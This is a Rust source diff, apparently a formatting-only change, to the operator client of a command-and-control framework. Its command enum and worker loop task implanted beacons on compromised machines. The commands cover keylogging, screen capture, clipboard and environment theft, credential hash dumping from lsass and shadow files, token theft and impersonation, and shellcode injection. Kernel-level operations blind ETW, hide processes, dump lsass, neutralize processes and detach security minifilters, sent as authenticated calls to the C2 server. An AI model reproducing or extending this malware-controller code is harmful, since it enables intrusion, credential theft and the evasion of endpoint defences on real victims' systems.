@@ -171,7 +171,9 @@ pub enum Cmd {
         local: Option<String>,
     },
     /// Task the beacon to exit (`{"type":"exit"}`).
-    Exit { session: String },
+    Exit {
+        session: String,
+    },
     /// Set the beacon's beacon interval (and optional jitter %).
     Sleep {
         session: String,
@@ -180,7 +182,9 @@ pub enum Cmd {
     },
     /// Liveness probe (`{"type":"ping"}`); an `ok` result confirms the beacon
     /// is still alive.
-    Ping { session: String },
+    Ping {
+        session: String,
+    },
     /// 文件系统操作（cd/mkdir/rm/mv/cp）。
     FileOp {
         session: String,
@@ -203,7 +207,10 @@ pub enum Cmd {
         port: u16,
     },
     /// 截屏。
-    Screenshot { session: String, monitor: u8 },
+    Screenshot {
+        session: String,
+        monitor: u8,
+    },
     /// 端口扫描。
     Portscan {
         session: String,
@@ -211,21 +218,43 @@ pub enum Cmd {
         ports: String,
     },
     /// 网络信息收集。
-    Net { session: String, query: String },
+    Net {
+        session: String,
+        query: String,
+    },
     /// 磁盘信息。
-    DriveInfo { session: String },
+    DriveInfo {
+        session: String,
+    },
     /// 剪贴板。
-    Clipboard { session: String },
+    Clipboard {
+        session: String,
+    },
     /// 环境变量。
-    Env { session: String, name: String },
+    Env {
+        session: String,
+        name: String,
+    },
     /// 键盘记录。action 0=start 1=stop 2=dump。
-    Keylog { session: String, action: u8 },
+    Keylog {
+        session: String,
+        action: u8,
+    },
     /// 持续截屏。
-    Screenwatch { session: String, interval_secs: u32 },
+    Screenwatch {
+        session: String,
+        interval_secs: u32,
+    },
     /// 凭据哈希提取。method 0=lsass 1=shadow。
-    Hashdump { session: String, method: u8 },
+    Hashdump {
+        session: String,
+        method: u8,
+    },
     /// 令牌窃取：复制 pid 的主令牌供后续冒用。
-    StealToken { session: String, pid: u32 },
+    StealToken {
+        session: String,
+        pid: u32,
+    },
     /// 造令牌（make-token / pass-the-password）：domain\user + password。
     /// logon_type 1=interactive 2=network 3=new-credentials。
     MakeToken {
@@ -236,9 +265,13 @@ pub enum Cmd {
         logon_type: u8,
     },
     /// 丢弃当前线程冒用（保留令牌）。
-    Rev2Self { session: String },
+    Rev2Self {
+        session: String,
+    },
     /// 查询当前线程身份。
-    GetUid { session: String },
+    GetUid {
+        session: String,
+    },
     /// 注入 shellcode。method/pid/spawn_to/sc_hex。
     Inject {
         session: String,
@@ -249,7 +282,9 @@ pub enum Cmd {
     },
     /// Pull the server-side credential store (`GET /api/creds`) and merge it
     /// into the local vault. `reveal` true sends `?reveal=1` for cleartext.
-    FetchCreds { reveal: bool },
+    FetchCreds {
+        reveal: bool,
+    },
     /// Query the server action-audit log (`GET /api/audit`). Optional operator
     /// / action / limit filters.
     FetchAudit {
@@ -275,17 +310,27 @@ pub enum Cmd {
     /// Fetch queued (undelivered) tasks for a session (`GET /api/tasks`).
     /// `session` is the beacon's hex id — the worker doesn't track selection,
     /// so the UI passes the currently-selected session in.
-    FetchTasks { session: String },
+    FetchTasks {
+        session: String,
+    },
     /// Fetch active C2 profile summary (`GET /api/profile`).
     FetchProfile,
     /// Close a relay channel (`Command::ChannelClose`).
-    CloseChan { chan: u32 },
+    CloseChan {
+        chan: u32,
+    },
     // ---- Kernel daemon ops (P6) ----
     KernelStatus,
     KernelBlindEtw,
-    KernelHide { pid: u32 },
-    KernelDumpLsass { pid: u32 },
-    KernelNeutralize { pid: u32 },
+    KernelHide {
+        pid: u32,
+    },
+    KernelDumpLsass {
+        pid: u32,
+    },
+    KernelNeutralize {
+        pid: u32,
+    },
     KernelDetachMinifilter,
     /// Stop the worker thread.
     Shutdown,
@@ -1388,8 +1433,13 @@ async fn worker_loop(
                     }
                 }
                 Cmd::KernelStatus => {
-                    let Some((ref srv, ref tok)) = server else { continue; };
-                    match authed(client.get(format!("{srv}/api/kernel/status")), tok).send().await {
+                    let Some((ref srv, ref tok)) = server else {
+                        continue;
+                    };
+                    match authed(client.get(format!("{srv}/api/kernel/status")), tok)
+                        .send()
+                        .await
+                    {
                         Ok(r) => match r.json::<serde_json::Value>().await {
                             Ok(v) => log_push(&mut log_buf, &format!("kernel: {v}"), Level::Info),
                             Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}"), Level::Err),
@@ -1398,51 +1448,109 @@ async fn worker_loop(
                     }
                 }
                 Cmd::KernelBlindEtw => {
-                    let Some((ref srv, ref tok)) = server else { continue; };
-                    match authed(client.post(format!("{srv}/api/kernel/blind-etw")), tok).send().await {
+                    let Some((ref srv, ref tok)) = server else {
+                        continue;
+                    };
+                    match authed(client.post(format!("{srv}/api/kernel/blind-etw")), tok)
+                        .send()
+                        .await
+                    {
                         Ok(r) => match r.json::<serde_json::Value>().await {
-                            Ok(v) => log_push(&mut log_buf, &format!("blind-etw: {v}"), Level::Info),
-                            Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err),
+                            Ok(v) => {
+                                log_push(&mut log_buf, &format!("blind-etw: {v}"), Level::Info)
+                            }
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err)
+                            }
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err),
                     }
                 }
                 Cmd::KernelHide { pid } => {
-                    let Some((ref srv, ref tok)) = server else { continue; };
-                    match authed(client.post(format!("{srv}/api/kernel/hide?pid={pid}")), tok).send().await {
+                    let Some((ref srv, ref tok)) = server else {
+                        continue;
+                    };
+                    match authed(client.post(format!("{srv}/api/kernel/hide?pid={pid}")), tok)
+                        .send()
+                        .await
+                    {
                         Ok(r) => match r.json::<serde_json::Value>().await {
-                            Ok(v) => log_push(&mut log_buf, &format!("hide {pid}: {v}"), Level::Info),
+                            Ok(v) => {
+                                log_push(&mut log_buf, &format!("hide {pid}: {v}"), Level::Info)
+                            }
                             Err(e) => log_push(&mut log_buf, &format!("! hide: {e}"), Level::Err),
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! hide: {e}"), Level::Err),
                     }
                 }
                 Cmd::KernelDumpLsass { pid } => {
-                    let Some((ref srv, ref tok)) = server else { continue; };
-                    match authed(client.post(format!("{srv}/api/kernel/dump-lsass?pid={pid}")), tok).send().await {
+                    let Some((ref srv, ref tok)) = server else {
+                        continue;
+                    };
+                    match authed(
+                        client.post(format!("{srv}/api/kernel/dump-lsass?pid={pid}")),
+                        tok,
+                    )
+                    .send()
+                    .await
+                    {
                         Ok(r) => match r.json::<serde_json::Value>().await {
-                            Ok(v) => log_push(&mut log_buf, &format!("dump-lsass {pid}: {v}"), Level::Info),
-                            Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err),
+                            Ok(v) => log_push(
+                                &mut log_buf,
+                                &format!("dump-lsass {pid}: {v}"),
+                                Level::Info,
+                            ),
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err)
+                            }
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err),
                     }
                 }
                 Cmd::KernelNeutralize { pid } => {
-                    let Some((ref srv, ref tok)) = server else { continue; };
-                    match authed(client.post(format!("{srv}/api/kernel/neutralize?pid={pid}")), tok).send().await {
+                    let Some((ref srv, ref tok)) = server else {
+                        continue;
+                    };
+                    match authed(
+                        client.post(format!("{srv}/api/kernel/neutralize?pid={pid}")),
+                        tok,
+                    )
+                    .send()
+                    .await
+                    {
                         Ok(r) => match r.json::<serde_json::Value>().await {
-                            Ok(v) => log_push(&mut log_buf, &format!("neutralize {pid}: {v}"), Level::Info),
-                            Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err),
+                            Ok(v) => log_push(
+                                &mut log_buf,
+                                &format!("neutralize {pid}: {v}"),
+                                Level::Info,
+                            ),
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err)
+                            }
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err),
                     }
                 }
                 Cmd::KernelDetachMinifilter => {
-                    let Some((ref srv, ref tok)) = server else { continue; };
-                    match authed(client.post(format!("{srv}/api/kernel/detach-minifilter")), tok).send().await {
+                    let Some((ref srv, ref tok)) = server else {
+                        continue;
+                    };
+                    match authed(
+                        client.post(format!("{srv}/api/kernel/detach-minifilter")),
+                        tok,
+                    )
+                    .send()
+                    .await
+                    {
                         Ok(r) => match r.json::<serde_json::Value>().await {
-                            Ok(v) => log_push(&mut log_buf, &format!("detach-minifilter: {v}"), Level::Info),
-                            Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err),
+                            Ok(v) => log_push(
+                                &mut log_buf,
+                                &format!("detach-minifilter: {v}"),
+                                Level::Info,
+                            ),
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err)
+                            }
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err),
                     }
